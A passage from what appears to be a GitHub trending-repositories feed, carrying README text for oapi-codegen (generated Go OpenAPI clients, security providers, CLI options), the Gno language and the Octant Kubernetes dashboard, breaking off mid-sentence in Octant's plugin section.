OpenAPI spec will result in a client function which takes the same arguments. It&#39;s difficult to handle any arbitrary body that Swagger supports, so we&#39;ve done some special casing for bodies, and you may get more than one function for an operation with a request body.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;If you have more than one request body type, meaning more than one media type, you will have a generic handler of this form:&lt;/p&gt; &lt;pre&gt;&lt;code&gt; AddPet(ctx context.Context, contentType string, body io.Reader)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you have only a JSON request body, you will get:&lt;/p&gt; &lt;pre&gt;&lt;code&gt; AddPet(ctx context.Context, body NewPet)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you have multiple request body types, which include a JSON type you will get two functions. We&#39;ve chosen to give the JSON version a shorter name, as we work with JSON and don&#39;t want to wear out our keyboards.&lt;/p&gt; &lt;pre&gt;&lt;code&gt; AddPet(ctx context.Context, body NewPet)&#xA; AddPetWithBody(ctx context.Context, contentType string, body io.Reader)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;The Client object above is fairly flexible, since you can pass in your own &lt;code&gt;http.Client&lt;/code&gt; and a request editing callback. You can use that callback to add headers. In our middleware stack, we annotate the context with additional information such as the request ID and function tracing information, and we use the callback to propagate that information into the request headers. Still, we can&#39;t foresee all possible usages, so those functions call through to helper functions which create requests. In the case of the pet store, we have:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Request generator for FindPets&#xA;func NewFindPetsRequest(server string, params *FindPetsParams) (*http.Request, error) {...}&#xA;&#xA;// Request generator for AddPet with JSON body&#xA;func NewAddPetRequest(server string, body NewPet) (*http.Request, error) {...}&#xA;&#xA;// Request generator for AddPet with non-JSON body&#xA;func NewAddPetRequestWithBody(server string, contentType string, body io.Reader) (*http.Request, error) {...}&#xA;&#xA;// Request generator for DeletePet&#xA;func NewDeletePetRequest(server string, id int64) (*http.Request, error) {...}&#xA;&#xA;// Request generator for FindPetById&#xA;func NewFindPetByIdRequest(server string, id int64) (*http.Request, error) {...}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can call these functions to build an &lt;code&gt;http.Request&lt;/code&gt; from Go objects, which will correspond to your request schema. They map one-to-one to the functions on the client, except that we always generate the generic non-JSON body handler.&lt;/p&gt; &#xA;&lt;p&gt;There are some caveats to using this code.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;exploded, form style query arguments, which are the default argument format in OpenAPI 3.0 are undecidable. Say that I have two objects, one composed of the fields &lt;code&gt;(name=bob, id=5)&lt;/code&gt; and another which has &lt;code&gt;(name=shoe, color=brown)&lt;/code&gt;. The first parameter is named &lt;code&gt;person&lt;/code&gt; and the second is named &lt;code&gt;item&lt;/code&gt;. The default marshaling style for query args would result in &lt;code&gt;/path/?name=bob,id=5&amp;amp;name=shoe,color=brown&lt;/code&gt;. In order to tell what belongs to which object, we&#39;d have to look at all the parameters and try to deduce it, but we&#39;re lazy, so we didn&#39;t. Don&#39;t use exploded form style arguments if you&#39;re passing around objects which have similar field names. If you used unexploded form parameters, you&#39;d have &lt;code&gt;/path/?person=name,bob,id,5&amp;amp;item=name,shoe,color,brown&lt;/code&gt;, which an be parsed unambiguously.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Parameters can be defined via &lt;code&gt;schema&lt;/code&gt; or via &lt;code&gt;content&lt;/code&gt;. Use the &lt;code&gt;content&lt;/code&gt; form for anything other than trivial objects, they can marshal to arbitrary JSON structures. When you send them as cookie (&lt;code&gt;in: cookie&lt;/code&gt;) arguments, we will URL encode them, since JSON delimiters aren&#39;t allowed in cookies.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Using SecurityProviders&lt;/h2&gt; &#xA;&lt;p&gt;If you generate client-code, you can use some default-provided security providers which help you to use the various OpenAPI 3 Authentication mechanism.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;    import (&#xA;        &#34;github.com/deepmap/oapi-codegen/pkg/securityprovider&#34;&#xA;    )&#xA;&#xA;    func CreateSampleProviders() error {&#xA;        // Example BasicAuth&#xA;        // See: https://swagger.io/docs/specification/authentication/basic-authentication/&#xA;        basicAuthProvider, basicAuthProviderErr := securityprovider.NewSecurityProviderBasicAuth(&#34;MY_USER&#34;, &#34;MY_PASS&#34;)&#xA;        if basicAuthProviderErr != nil {&#xA;            panic(basicAuthProviderErr)&#xA;        }&#xA;&#xA;        // Example BearerToken&#xA;        // See: https://swagger.io/docs/specification/authentication/bearer-authentication/&#xA;        bearerTokenProvider, bearerTokenProviderErr := securityprovider.NewSecurityProviderBearerToken(&#34;MY_TOKEN&#34;)&#xA;        if bearerTokenProviderErr != nil {&#xA;            panic(bearerTokenProviderErr)&#xA;        }&#xA;&#xA;        // Example ApiKey provider&#xA;        // See: https://swagger.io/docs/specification/authentication/api-keys/&#xA;        apiKeyProvider, apiKeyProviderErr := securityprovider.NewSecurityProviderApiKey(&#34;query&#34;, &#34;myApiKeyParam&#34;, &#34;MY_API_KEY&#34;)&#xA;        if apiKeyProviderErr != nil {&#xA;            panic(apiKeyProviderErr)&#xA;        }&#xA;&#xA;        // Example providing your own provider using an anonymous function wrapping in the&#xA;        // InterceptoFn adapter. The behaviour between the InterceptorFn and the Interceptor interface&#xA;        // are the same as http.HandlerFunc and http.Handler.&#xA;        customProvider := func(req *http.Request, ctx context.Context) error {&#xA;            // Just log the request header, nothing else.&#xA;            log.Println(req.Header)&#xA;            return nil&#xA;        }&#xA;&#xA;        // Exhaustive list of some defaults you can use to initialize a Client.&#xA;        // If you need to override the underlying httpClient, you can use the option&#xA;        //&#xA;        // WithHTTPClient(httpClient *http.Client)&#xA;        //&#xA;        client, clientErr := NewClient(&#34;https://api.deepmap.com&#34;, WithRequestEditorFn(apiKeyProvider.Intercept))&#xA;&#xA;        return nil&#xA;    }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Extensions&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;oapi-codegen&lt;/code&gt; supports the following extended properties:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;x-go-type&lt;/code&gt;: specifies Go type name. It allows you to specify the type name for a schema, and will override any default value. This extended property isn&#39;t supported in all parts of OpenAPI, so please refer to the spec as to where it&#39;s allowed. Swagger validation tools will flag incorrect usage of this property.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;x-go-name&lt;/code&gt;: specifies Go field name. It allows you to specify the field name for a schema, and will override any default value. This extended property isn&#39;t supported in all parts of OpenAPI, so please refer to the spec as to where it&#39;s allowed. Swagger validation tools will flag incorrect usage of this property.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;x-oapi-codegen-extra-tags&lt;/code&gt;: adds extra Go field tags to the generated struct field. This is useful for interfacing with tag based ORM or validation libraries. The extra tags that are added are in addition to the regular json tags that are generated. If you specify your own &lt;code&gt;json&lt;/code&gt; tag, you will override the default one.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;components:&#xA;  schemas:&#xA;    Object:&#xA;      properties:&#xA;        name:&#xA;          type: string&#xA;          x-oapi-codegen-extra-tags:&#xA;            tag1: value1&#xA;            tag2: value2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;In the example above, field &lt;code&gt;name&lt;/code&gt; will be declared as:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;Name string `json:&#34;name&#34; tag1:&#34;value1&#34; tag2:&#34;value2&#34;`&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Using &lt;code&gt;oapi-codegen&lt;/code&gt;&lt;/h2&gt; &#xA;&lt;p&gt;The default options for &lt;code&gt;oapi-codegen&lt;/code&gt; will generate everything; client, server, type definitions and embedded swagger spec, but you can generate subsets of those via the &lt;code&gt;-generate&lt;/code&gt; flag. It defaults to &lt;code&gt;types,client,server,spec&lt;/code&gt;, but you can specify any combination of those.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;types&lt;/code&gt;: generate all type definitions for all types in the OpenAPI spec. This will be everything under &lt;code&gt;#components&lt;/code&gt;, as well as request parameter, request body, and response type objects.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;server&lt;/code&gt;: generate the Echo server boilerplate. &lt;code&gt;server&lt;/code&gt; requires the types in the same package to compile.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;chi-server&lt;/code&gt;: generate the Chi server boilerplate. This code is dependent on that produced by the &lt;code&gt;types&lt;/code&gt; target.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;client&lt;/code&gt;: generate the client boilerplate. It, too, requires the types to be present in its package.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;spec&lt;/code&gt;: embed the OpenAPI spec into the generated code as a gzipped blob. This&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;skip-fmt&lt;/code&gt;: skip running &lt;code&gt;goimports&lt;/code&gt; on the generated code. This is useful for debugging the generated file in case the spec contains weird strings.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;skip-prune&lt;/code&gt;: skip pruning unused components from the spec prior to generating the code.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;import-mapping&lt;/code&gt;: specifies a map of references external OpenAPI specs to go Go include paths. Please see below.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;So, for example, if you would like to produce only the server code, you could run &lt;code&gt;oapi-codegen -generate types,server&lt;/code&gt;. You could generate &lt;code&gt;types&lt;/code&gt; and &lt;code&gt;server&lt;/code&gt; into separate files, but both are required for the server code.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;oapi-codegen&lt;/code&gt; can filter paths base on their tags in the openapi definition. Use either &lt;code&gt;-include-tags&lt;/code&gt; or &lt;code&gt;-exclude-tags&lt;/code&gt; followed by a comma-separated list of tags. For instance, to generate a server that serves all paths except those tagged with &lt;code&gt;auth&lt;/code&gt; or &lt;code&gt;admin&lt;/code&gt;, use the argument, &lt;code&gt;-exclude-tags=&#34;auth,admin&#34;&lt;/code&gt;. To generate a server that only handles &lt;code&gt;admin&lt;/code&gt; paths, use the argument &lt;code&gt;-include-tags=&#34;admin&#34;&lt;/code&gt;. When neither of these arguments is present, all paths are generated.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;oapi-codegen&lt;/code&gt; can filter schemas based on the option &lt;code&gt;--exclude-schemas&lt;/code&gt;, which is a comma separated list of schema names. For instance, &lt;code&gt;--exclude-schemas=Pet,NewPet&lt;/code&gt; will exclude from generation schemas &lt;code&gt;Pet&lt;/code&gt; and &lt;code&gt;NewPet&lt;/code&gt;. This allow to have a in the same package a manually defined structure or interface and refer to it in the openapi spec.&lt;/p&gt; &#xA;&lt;p&gt;Since &lt;code&gt;go generate&lt;/code&gt; commands must be a single line, all the options above can make them pretty unwieldy, so you can specify all of the options in a configuration file via the &lt;code&gt;--config&lt;/code&gt; option. Please see the test under &lt;a href=&#34;https://github.com/deepmap/oapi-codegen/raw/master/internal/test/externalref/externalref.cfg.yaml&#34;&gt;&lt;code&gt;/internal/test/externalref/&lt;/code&gt;&lt;/a&gt; for an example. The structure of the file is as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;output:&#xA;  externalref.gen.go&#xA;package: externalref&#xA;generate:&#xA;  - types&#xA;  - skip-prune&#xA;import-mapping:&#xA;  ./packageA/spec.yaml: github.com/deepmap/oapi-codegen/internal/test/externalref/packageA&#xA;  ./packageB/spec.yaml: github.com/deepmap/oapi-codegen/internal/test/externalref/packageB&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Have a look at &lt;a href=&#34;https://github.com/deepmap/oapi-codegen/raw/master/cmd/oapi-codegen/oapi-codegen.go#L48&#34;&gt;&lt;code&gt;cmd/oapi-codegen/oapi-codegen.go&lt;/code&gt;&lt;/a&gt; to see all the fields on the configuration structure.&lt;/p&gt; &#xA;&lt;h3&gt;Import Mappings&lt;/h3&gt; &#xA;&lt;p&gt;OpenAPI specifications may contain references to other OpenAPI specifications, and we need some additional information in order to be able to generate correct Go code.&lt;/p&gt; &#xA;&lt;p&gt;An external reference looks like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ref: ./some_spec.yaml#/components/schemas/Type&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We assume that you have already generated the boilerplate code for &lt;code&gt;./some_spec.yaml&lt;/code&gt; using &lt;code&gt;oapi-codegen&lt;/code&gt;, and you have a package which contains the generated code, let&#39;s call it &lt;code&gt;github.com/deepmap/some-package&lt;/code&gt;. You need to tell &lt;code&gt;oapi-codegen&lt;/code&gt; that &lt;code&gt;some_spec.yaml&lt;/code&gt; corresponds to this package, and you would do it by specifying this command line argument:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;-import-mapping=./some_spec.yaml:github.com/deepmap/some-package&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This tells us that in order to resolve references generated from &lt;code&gt;some_spec.yaml&lt;/code&gt; we need to import &lt;code&gt;github.com/deepmap/some-package&lt;/code&gt;. You may specify multiple mappings by comma separating them in the form &lt;code&gt;key1:value1,key2:value2&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;What&#39;s missing or incomplete&lt;/h2&gt; &#xA;&lt;p&gt;This code is still young, and not complete, since we&#39;re filling it in as we need it. We&#39;ve not yet implemented several things:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;oneOf&lt;/code&gt;, &lt;code&gt;anyOf&lt;/code&gt; are not supported with strong Go typing. This schema:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;  schema:&#xA;    oneOf:&#xA;      - $ref: &#39;#/components/schemas/Cat&#39;&#xA;      - $ref: &#39;#/components/schemas/Dog&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;will result in a Go type of &lt;code&gt;interface{}&lt;/code&gt;. It will be up to you to validate whether it conforms to &lt;code&gt;Cat&lt;/code&gt; and/or &lt;code&gt;Dog&lt;/code&gt;, depending on the keyword. It&#39;s not clear if we can do anything much better here given the limits of Go typing.&lt;/p&gt; &lt;p&gt;&lt;code&gt;allOf&lt;/code&gt; is supported, by taking the union of all the fields in all the component schemas. This is the most useful of these operations, and is commonly used to merge objects with an identifier, as in the &lt;code&gt;petstore-expanded&lt;/code&gt; example.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;patternProperties&lt;/code&gt; isn&#39;t yet supported and will exit with an error. Pattern properties were defined in JSONSchema, and the &lt;code&gt;kin-openapi&lt;/code&gt; Swagger object knows how to parse them, but they&#39;re not part of OpenAPI 3.0, so we&#39;ve left them out, as support is very complicated.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Making changes to code generation&lt;/h2&gt; &#xA;&lt;p&gt;The code generator uses a tool to inline all the template definitions into code, so that we don&#39;t have to deal with the location of the template files. When you update any of the files under the &lt;code&gt;templates/&lt;/code&gt; directory, you will need to regenerate the template inlines:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;go generate ./pkg/codegen/templates&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;All this command does is inline the files ending in &lt;code&gt;.tmpl&lt;/code&gt; into the specified Go file.&lt;/p&gt; &#xA;&lt;p&gt;Afterwards you should run &lt;code&gt;go generate ./...&lt;/code&gt;, and the templates will be updated accordingly.&lt;/p&gt; &#xA;&lt;p&gt;Alternatively, you can provide custom templates to override built-in ones using the &lt;code&gt;-templates&lt;/code&gt; flag specifying a path to a directory containing templates files. These files &lt;strong&gt;must&lt;/strong&gt; be named identically to built-in template files (see &lt;code&gt;pkg/codegen/templates/*.tmpl&lt;/code&gt; in the source code), and will be interpreted on-the-fly at run time. Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ls -1 my-templates/&#xA;client.tmpl&#xA;typedef.tmpl&#xA;$ oapi-codegen \&#xA;    -templates my-templates/ \&#xA;    -generate types,client \&#xA;    petstore-expanded.yaml&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>gnolang/gno</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/gnolang/gno</id>
    <link href="https://github.com/gnolang/gno" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Gno language&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Gno&lt;/h1&gt; &#xA;&lt;p&gt;At first, there was Bitcoin, out of entropy soup of the greater All. Then, there was Ethereum, which was created in the likeness of Bitcoin, but made Turing complete.&lt;/p&gt; &#xA;&lt;p&gt;Among these were Tendermint and Cosmos to engineer robust PoS and IBC. Then came Gno upon Cosmos and there spring forth Gnoland, simulated by the Gnomes of the Greater Resistance.&lt;/p&gt; &#xA;&lt;h2&gt;Install &lt;code&gt;gnokey&lt;/code&gt;&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;git clone &lt;a href=&#34;mailto:git@github.com&#34;&gt;git@github.com&lt;/a&gt;:gnolang/gno.git&lt;br&gt; cd ./gno&lt;br&gt; make install_gnokey&lt;br&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Also, see the &lt;a href=&#34;https://gno.land/r/boards:gnolang/4&#34;&gt;quickstart guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Language Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Like interpreted Go, but more ambitious.&lt;/li&gt; &#xA; &lt;li&gt;Completely deterministic, for complete accountability.&lt;/li&gt; &#xA; &lt;li&gt;Transactional persistence across data realms.&lt;/li&gt; &#xA; &lt;li&gt;Designed for concurrent blockchain smart contracts systems.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contact&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Discord: &lt;a href=&#34;https://discord.gg/YFtMjWwUN7&#34;&gt;https://discord.gg/YFtMjWwUN7&lt;/a&gt; &amp;lt;-- join now&lt;/li&gt; &#xA; &lt;li&gt;Gnoland: &lt;a href=&#34;https://gno.land/r/boards:gnolang&#34;&gt;https://gno.land/r/boards:gnolang&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Telegram: &lt;a href=&#34;https://t.me/gnoland&#34;&gt;https://t.me/gnoland&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Twitter: &lt;a href=&#34;https://twitter.com/_gnoland&#34;&gt;https://twitter.com/_gnoland&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>vmware-tanzu/octant</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/vmware-tanzu/octant</id>
    <link href="https://github.com/vmware-tanzu/octant" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Highly extensible platform for developers to better understand the complexity of Kubernetes clusters.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/vmware-tanzu/octant/master/web/src/assets/octant-logo.png&#34; alt=&#34;Logo&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/vmware-tanzu/octant/workflows/preflight-checks/badge.svg&#34;&gt;&lt;img src=&#34;https://github.com/vmware-tanzu/octant/workflows/preflight-checks/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/release/vmware-tanzu/octant.svg?sanitize=true&#34; alt=&#34;GitHub release&#34;&gt; &lt;a href=&#34;https://opensource.org/licenses/Apache-2.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache%202.0-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://bestpractices.coreinfrastructure.org/projects/4142&#34;&gt;&lt;img src=&#34;https://bestpractices.coreinfrastructure.org/projects/4142/badge&#34; alt=&#34;CII Best Practices&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;A highly extensible platform for developers to better understand the complexity of Kubernetes clusters.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Octant is a tool for developers to understand how applications run on a Kubernetes cluster. It aims to be part of the developer&#39;s toolkit for gaining insight and approaching complexity found in Kubernetes. Octant offers a combination of introspective tooling, cluster navigation, and object management along with a plugin system to further extend its capabilities.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Resource Viewer&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;Graphically visualize relationships between objects in a Kubernetes cluster. The status of individual objects are represented by color to show workload performance.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Summary View&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;Consolidated status and configuration information in a single page aggregated from output typically found using multiple kubectl commands.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Port Forward&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;Forward a local port to a running pod with a single button for debugging applications and even port forward multiple pods across namespaces.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Log Stream&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;View log streams of pod and container activity for troubleshooting or monitoring without holding multiple terminals open.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Label Filter&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;Organize workloads with label filtering for inspecting clusters with a high volume of objects in a namespace.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Cluster Navigation&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;Easily change between namespaces or contexts across different clusters. Multiple kubeconfig files are also supported.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Plugin System&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;Highly extensible plugin system for users to provide additional functionality through gRPC. Plugin authors can add components on top of existing views.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/vmware-tanzu/octant/master/web/src/assets/octant-demo.gif&#34; alt=&#34;Octant demo&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;h3&gt;Package (Linux only)&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Download the &lt;code&gt;.deb&lt;/code&gt; or &lt;code&gt;.rpm&lt;/code&gt; from the &lt;a href=&#34;https://github.com/vmware-tanzu/octant/releases&#34;&gt;releases page&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Install with either &lt;code&gt;dpkg -i&lt;/code&gt; or &lt;code&gt;rpm -i&lt;/code&gt; respectively.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Windows&lt;/h3&gt; &#xA;&lt;h4&gt;Chocolatey&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Install using chocolatey with the following one-liner:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;choco install octant --confirm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;Scoop&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Add the &lt;a href=&#34;https://github.com/lukesampson/scoop-extras&#34;&gt;extras&lt;/a&gt; bucket.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;scoop bucket add extras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Install using scoop.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;scoop install octant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;macOS&lt;/h3&gt; &#xA;&lt;h4&gt;Homebrew&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Install using Homebrew with the following one-liner:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;brew install octant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Download a Pre-built Binary (Linux, macOS, Windows)&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Open the &lt;a href=&#34;https://github.com/vmware-tanzu/octant/releases&#34;&gt;releases page&lt;/a&gt; from a browser and download the latest tarball or zip file.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Extract the tarball or zip where &lt;code&gt;X.Y&lt;/code&gt; is the release version:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ tar -xzvf ~/Downloads/octant_0.X.Y_Linux-64bit.tar.gz&#xA;octant_0.X.Y_Linux-64bit/README.md&#xA;octant_0.X.Y_Linux-64bit/octant&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Verify it runs:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ./octant_0.X.Y_Linux-64bit/octant version&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Nightly Builds&lt;/h2&gt; &#xA;&lt;p&gt;Nightly builds of Octant are available for download.&lt;/p&gt; &#xA;&lt;p&gt;Please note that nightly builds maybe less stable than our tagged releases and are intended to allow early access to preview upcoming features and for plugin authors who want access to the latest plugin APIs.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://console.cloud.google.com/storage/browser/octant-nightlies&#34;&gt;Browse nightly builds&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;Before starting Octant, make sure you have access to a healthy cluster. If kubectl is installed, test using &lt;code&gt;kubectl cluster-info&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Start running Octant:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;$ octant&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Octant should immediately launch your default web browser on &lt;code&gt;127.0.0.1:7777&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Octant uses the default web browser on the system to act as the UI client. In the future Octant will ship with a UI.&lt;/p&gt; &#xA;&lt;p&gt;For setting extra configuration such as what kubeconfig or context to use at startup, refer to the &lt;a href=&#34;https://reference.octant.dev/&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Supported Versions&lt;/h2&gt; &#xA;&lt;p&gt;Octant versions follow &lt;a href=&#34;https://semver.org/&#34;&gt;Semantic Versioning&lt;/a&gt; where a given version number represents &lt;code&gt;MAJOR.MINOR.PATCH&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Patch releases address bug fixes, regressions, and small enhancements.&lt;/p&gt; &#xA;&lt;p&gt;Minor releases contain security fixes, API changes, and significant enhancements such as UI changes or new components.&lt;/p&gt; &#xA;&lt;p&gt;Major releases contain breaking changes that are not guaranteed to be backwards compatible. Octant versions before 1.0 should not be considered stable and API may change between minor releases.&lt;/p&gt; &#xA;&lt;h3&gt;Supported Version Skew&lt;/h3&gt; &#xA;&lt;p&gt;Version of Octant are compiled against a version of client-go.&lt;/p&gt; &#xA;&lt;p&gt;Octant follows an &lt;code&gt;n±1&lt;/code&gt; policy for versions of Kubernetes similar to kubectl. For example, Octant &lt;code&gt;0.16.0&lt;/code&gt; uses the Kubernetes 1.19 client. So version &lt;code&gt;0.16.0&lt;/code&gt; can be used with Kubernetes 1.18, 1.19, and 1.20.&lt;/p&gt; &#xA;&lt;h2&gt;Plugins&lt;/h2&gt; &#xA;&lt;p&gt;Plugins are a core part of Octant in the Kubernetes ecosystem. A plugin can read objects and allows users to add components to Octant&#39;s views.&lt;/p&gt; &#xA;&lt;p&gt;An example plugin can be found in &lt;a href=&#34;https://raw.githubusercontent.com/vmware-tanzu/octant/master/cmd/octant-sample-plugin&#34;&gt;&lt;code&gt;cmd/octant-sample-plugin&lt;/code&gt;&lt;/a&gt; and installed to the default plugin path with 